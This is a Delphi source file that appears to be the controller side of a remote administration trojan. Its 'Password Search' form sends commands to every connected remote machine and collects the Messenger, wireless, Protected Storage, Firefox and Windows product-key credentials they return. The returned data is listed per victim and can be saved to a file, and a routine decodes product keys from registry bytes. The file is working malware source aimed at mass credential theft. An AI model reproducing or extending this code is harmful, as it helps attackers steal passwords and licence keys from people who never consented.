unit UnitPasswordSearch;

interface

uses
  ScktComp, Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ImgList, Menus, ComCtrls, ScanF;

type
  TPasswordSearch = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    ListView3: TListView;
    ListView2: TListView;
    ListView1: TListView;
    PopupMenu2: TPopupMenu;
    MenuItem1: TMenuItem;
    SaveToFile1: TMenuItem;
    ImageList1: TImageList;
    StatusBar1: TStatusBar;
    StatusBar2: TStatusBar;
    StatusBar3: TStatusBar;
    SaveDialog1: TSaveDialog;
    TabSheet4: TTabSheet;
    ListView4: TListView;
    StatusBar4: TStatusBar;
    TabSheet5: TTabSheet;
    ListView5: TListView;
    StatusBar5: TStatusBar;
    procedure MenuItem1Click(Sender: TObject);
    procedure ListView3CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView3CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure ListView2CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView2CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure ListView1CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView1CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure SaveToFile1Click(Sender: TObject);
    procedure ListView4CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView4CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
    procedure ListView5CustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure ListView5CustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      var DefaultDraw: Boolean);
  private
    { Private declarations }
  public
    { Public declarations }
    procedure ParseData(Socket: TCustomWinSocket; Data: string);
    function GetSerialKey(Data: string): string;

  end;

var
  PasswordSearch: TPasswordSearch;

implementation

uses
  UnitCOnnectionForm, UnitSharedData;

{$R *.dfm}

function DecodeProdKey(des,src: PChar; dlen,slen: Integer): Integer;
const   digits:     PChar = 'BCDFGHJKMPQRTVWXY2346789';
var     i:          Integer;
        n:          Integer;
        _hi:        Integer;
        _low:       Integer;
        value:      Integer;
begin
  ZeroMemory(des, dlen);
  for i:=Pred(dlen) downto 0 do
  begin
     if (((i+1) mod 6) = 0) then
     begin
        des[i]:='-';
        des[dlen]:=#0;
     end
     else
     begin
        n:=slen-1;
        _hi:=0;
        repeat
           _low:=Ord(src[n]);
           value:=_hi shl 8;
           value:=value or _low;
         // This makes no sense ??? 2 assigments
         //  src[n]:=Chr(value mod 24);
           src[n]:=Chr(value div 24);
           _hi:=value mod 24;
           dec(n);
        until (n < 0);
        des[i]:=digits[value mod 24];
        des[dlen]:=#0;
     end;
  end;
  result:=0;
end;

function TPasswordSearch.GetSerialKey(Data: string): string;
var
  Command: string;
  Strings: TStringList;
  i: integer;
  SocketData: TSocketData;
  Li: TListItem;
  Stream: TMemoryStream;
  bSize: integer;
  n: integer;
  DigitalProductId,ProductId: string;
  InstallDate: dword;
  Buffer: array of Byte;
  IDATE: TDAteTime;
  HexStr: string;
  plain_pk: array[0..32] of char;
  cryp_pk: array[0..15] of char;
begin
  if data = '' then exit;
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.Position := 0;

    Stream.Read(bSize,sizeof(integer));
    SetLength(DigitalProductId,bSize);
    Stream.Read(pointer(DigitalProductId)^,bSize);
    SetLength(Buffer, bSize);
    for n := 1 to bSize do Buffer[n-1] := byte(DigitalProductId[n]);

    for n := 0 to bSize -1 do HexStr := HexStr + IntToHex((Buffer[n]), 2);
    HexStr := Copy(HexStr,105,30);

    Stream.Read(bSize,sizeof(integer));
    SetLength(ProductId,bSize);
    Stream.Read(pointer(ProductId)^,bSize);

    Stream.Read(InstallDate,Stream.Size - Stream.Position);
    IDate := EncodeDate(1970,1,1) + InstallDate / 86400;

    for n := 0 to 32 do begin
      SScanf(Pchar(copy(HexStr,1,2)),'%02x',[@cryp_pk[n]]);
      delete(HexStr,1,2);
    end;
    plain_pk[n]:=#0;
    DecodeProdKey(plain_pk,cryp_pk,29,15);
    Stream.Free;

    Result := StrPas(plain_PK);

end;

procedure TPasswordSearch.ParseData(Socket: TCustomWinSocket; Data: string);
var
  Command: string;
  Strings: TStringList;
  i: integer;
  SocketData: TSocketData;
  Li: TListItem;
  Stream: TMemoryStream;
  bSize: integer;
  n: integer;
  DigitalProductId,ProductId: string;
  InstallDate: dword;
  Buffer: array of Byte;
  IDATE: TDAteTime;
  HexStr: string;
  plain_pk: array[0..32] of char;
  cryp_pk: array[0..15] of char;
begin
  SocketData := TSocketData(Socket.Data);

  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Messenger' then begin
    Strings := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      Li := PasswordSearch.Listview1.Items.Add;
      Li.Caption := SocketData.ServerData.Group + ' - ' + SocketData.ServerData.Name;
      Li.SubItems.Add(Split(Strings[i],'|',1));
      Li.SubItems.Add(Split(Strings[i],'|',2));
    end;
    PasswordSearch.Statusbar3.SimpleText := inttostr(PasswordSearch.Listview1.Items.Count) + ' Passwords';
    Strings.Free;
  end;

  if Command = 'Wireless' then begin
    Strings := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      Li := PasswordSearch.Listview2.Items.Add;
      Li.Caption := SocketData.ServerData.Group + ' - ' + SocketData.ServerData.Name;
      Li.SubItems.Add(Split(Strings[i],'|',1));
      Li.SubItems.Add(Split(Strings[i],'|',2));
      Li.SubItems.Add(Split(Strings[i],'|',3));
    end;
    PasswordSearch.Statusbar2.SimpleText := inttostr(PasswordSearch.Listview2.Items.Count) + ' Passwords';
    Strings.Free;
  end;

  if Command = 'Storage' then begin
    Strings := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      Li := PasswordSearch.Listview3.Items.Add;
      Li.Caption := SocketData.ServerData.Group + ' - ' + SocketData.ServerData.Name;
      Li.SubItems.Add(Split(Strings[i],'|',1));
      Li.SubItems.Add(Split(Strings[i],'|',2));
      Li.SubItems.Add(Split(Strings[i],'|',3));
      Li.SubItems.Add(Split(Strings[i],'|',4));
      Li.SubItems.Add(Split(Strings[i],'|',5));
    end;
    PasswordSearch.Statusbar1.SimpleText := inttostr(PasswordSearch.Listview3.Items.Count) + ' Passwords';
    Strings.Free;
  end;

  if Command = 'Firefox' then begin
    Strings := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      Li := PasswordSearch.Listview5.Items.Add;
      Li.Caption := SocketData.ServerData.Group + ' - ' + SocketData.ServerData.Name;
      Li.SubItems.Add(Split(Strings[i],'|',1));
      Li.SubItems.Add(Split(Strings[i],'|',2));
      Li.SubItems.Add(Split(Strings[i],'|',3));
    end;
    PasswordSearch.Statusbar5.SimpleText := inttostr(PasswordSearch.Listview5.Items.Count) + ' Passwords';
    Strings.Free;
  end;

  if Command = 'ProductKey' then begin
    Stream := TMemoryStream.Create;
    Stream.Write(pointer(Data)^,Length(Data));
    Stream.Position := 0;

    Stream.Read(bSize,sizeof(integer));
    SetLength(DigitalProductId,bSize);
    Stream.Read(pointer(DigitalProductId)^,bSize);
    SetLength(Buffer, bSize);
    for n := 1 to bSize do Buffer[n-1] := byte(DigitalProductId[n]);

    for n := 0 to bSize -1 do HexStr := HexStr + IntToHex((Buffer[n]), 2);
    HexStr := Copy(HexStr,105,30);

    Stream.Read(bSize,sizeof(integer));
    SetLength(ProductId,bSize);
    Stream.Read(pointer(ProductId)^,bSize);

    Stream.Read(InstallDate,Stream.Size - Stream.Position);
    IDate := EncodeDate(1970,1,1) + InstallDate / 86400;

    for n := 0 to 32 do begin
      SScanf(Pchar(copy(HexStr,1,2)),'%02x',[@cryp_pk[n]]);
      delete(HexStr,1,2);
    end;
    plain_pk[n]:=#0;
    DecodeProdKey(plain_pk,cryp_pk,29,15);
    Stream.Free;

    Li := PasswordSearch.Listview4.Items.Add;
    Li.Caption := SocketData.ServerData.Group + ' - ' + SocketData.ServerData.Name;
    Li.SubItems.Add(SocketData.ServerData.Os);
    Li.SubItems.Add(StrPas(plain_PK));
    Li.SubItems.Add(ProductId);
    Li.SubItems.Add(DateTimeToSTr(IDate));
    PasswordSearch.Statusbar4.SimpleText := inttostr(PasswordSearch.Listview4.Items.Count) + ' Passwords';
  end;

  {if Command = 'Internet' then begin
    Strings := TStringList.Create;
    Strings.Text := Data;
    for i := 0 to Strings.Count -1 do begin
      Li := PasswordSearch.Listview6.Items.Add;
      Li.Caption := SocketData.ServerData.Group + ' - ' + SocketData.ServerData.Name;
      Li.SubItems.Add(Split(Strings[i],'|',1));
      Li.SubItems.Add(Split(Strings[i],'|',2));
      Li.SubItems.Add(Split(Strings[i],'|',3));
      Li.SubItems.Add(Split(Strings[i],'|',4));
      Li.SubItems.Add(Split(Strings[i],'|',5));
    end;
    PasswordSearch.Statusbar1.SimpleText := inttostr(PasswordSearch.Listview6.Items.Count) + ' Passwords';
    Strings.Free;
  end;}

end;

procedure TPasswordSearch.MenuItem1Click(Sender: TObject);
var
  i,x: integer;
  ConnectionFOrm: TConnectionForm;
  SocketData: TSocketData;
begin
  if PageControl1.ActivePage.Caption = 'Protected Storage' then Listview3.Clear;
  if PageControl1.ActivePage.Caption = 'Wireless' then Listview2.Clear;
  if PageControl1.ActivePage.Caption = 'Messenger' then Listview1.Clear;
  if PageControl1.ActivePage.Caption = 'Product Key' then Listview4.Clear;
  if PageControl1.ActivePage.Caption = 'Firefox' then Listview5.Clear;
  //if PageControl1.ActivePage.Caption = 'Internet' then Listview6.Clear;

  for i := 0 to Screen.FormCount -1 do begin
    if Screen.Forms[i].ClassType <> TConnectionForm then Continue;
    ConnectionForm := TConnectionForm(Screen.Forms[i]);
    for x := 0 to ConnectionForm.ListView1.Items.Count -1 do begin
      SocketData := TSocketData(ConnectionForm.ListView1.Items[x].Data);
      if SocketData = nil then Continue;
      if PageControl1.ActivePage.Caption = 'Protected Storage' then SendData(SocketData.MainSocket,'Storage');
      if PageControl1.ActivePage.Caption = 'Wireless' then SendData(SocketData.MainSocket,'Wireless');
      if PageControl1.ActivePage.Caption = 'Messenger' then SendData(SocketData.MainSocket,'Messenger');
      if PageControl1.ActivePage.Caption = 'Product Key' then SendData(SocketData.MainSocket,'ProductKey');
      if PageControl1.ActivePage.Caption = 'Firefox' then SendData(SocketData.MainSocket,'Firefox');
      if PageControl1.ActivePage.Caption = 'Internet Explorer' then SendData(SocketData.MainSocket,'Internet');
    end;
  end;
end;

procedure TPasswordSearch.ListView3CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview3.Canvas.Brush.Color := $F7F7F7;
end;

procedure TPasswordSearch.ListView3CustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview3.Canvas.Brush.Color := clWhite;
end;

procedure TPasswordSearch.ListView2CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview2.Canvas.Brush.Color := $F7F7F7;
end;

procedure TPasswordSearch.ListView2CustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview2.Canvas.Brush.Color := clWhite;
end;

procedure TPasswordSearch.ListView1CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := $F7F7F7;
end;

procedure TPasswordSearch.ListView1CustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview1.Canvas.Brush.Color := clWhite;
end;

procedure SaveToFile(Li: TListview; FileName: string);
var
  i,x: integer;
  s: string;
  Stream: TMemoryStream;
begin
  for x := 0 to Li.Items.Count -1 do begin
    for i := 0 to Li.Columns.Count -1 do begin
      if i = 0 then begin
        s := s + Li.Column[i].Caption + ': ' + Li.Items[x].Caption + #13#10;
      end else begin
        s := s + Li.Column[i].Caption + ': ' + Li.Items[x].SubItems[i-1] + #13#10;
      end;
    end;
    s := s + #13#10;
  end;
  Stream := TMemoryStream.Create;
  Stream.Write(pointer(s)^,length(s));
  Stream.SaveToFile(FileName);
  Stream.Free;
end;

procedure TPasswordSearch.SaveToFile1Click(Sender: TObject);
begin
  if not SaveDialog1.Execute then exit;
  if PageControl1.ActivePage.Caption = 'Protected Storage' then SaveToFile(Listview3,SaveDialog1.FileName);
  if PageControl1.ActivePage.Caption = 'Wireless' then SaveToFile(Listview2,SaveDialog1.FileName);
  if PageControl1.ActivePage.Caption = 'Messenger' then SaveToFile(Listview1,SaveDialog1.FileName);
  if PageControl1.ActivePage.Caption = 'Product Key' then SaveToFile(Listview4,SaveDialog1.FileName);
  if PageControl1.ActivePage.Caption = 'Firefox' then SaveToFile(Listview5,SaveDialog1.FileName);
  //if PageControl1.ActivePage.Caption = 'Internet' then SaveToFile(Listview6,SaveDialog1.FileName);
end;

procedure TPasswordSearch.ListView4CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview4.Canvas.Brush.Color := $F7F7F7;
end;

procedure TPasswordSearch.ListView4CustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview4.Canvas.Brush.Color := clWhite;
end;

procedure TPasswordSearch.ListView5CustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview5.Canvas.Brush.Color := $F7F7F7;
end;

procedure TPasswordSearch.ListView5CustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  Listview5.Canvas.Brush.Color := clWhite;
end;

end.
